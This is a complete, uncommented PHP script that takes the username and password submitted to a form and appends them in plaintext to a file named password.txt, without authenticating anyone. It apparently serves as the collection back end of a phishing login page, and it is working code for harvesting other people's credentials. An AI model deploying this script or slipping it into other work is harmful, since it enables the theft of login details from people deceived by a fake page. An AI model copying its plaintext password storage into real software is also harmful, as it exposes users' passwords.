<?php
  $user = $_POST['username'];
  $pass = $_POST['password'];
  $writeStr = $user.":".$pass."\n";
  $writeFile = fopen("./password.txt","a");
  fwrite($writeFile, $user.":".$pass."\n");
  fclose($writeFile);
?>
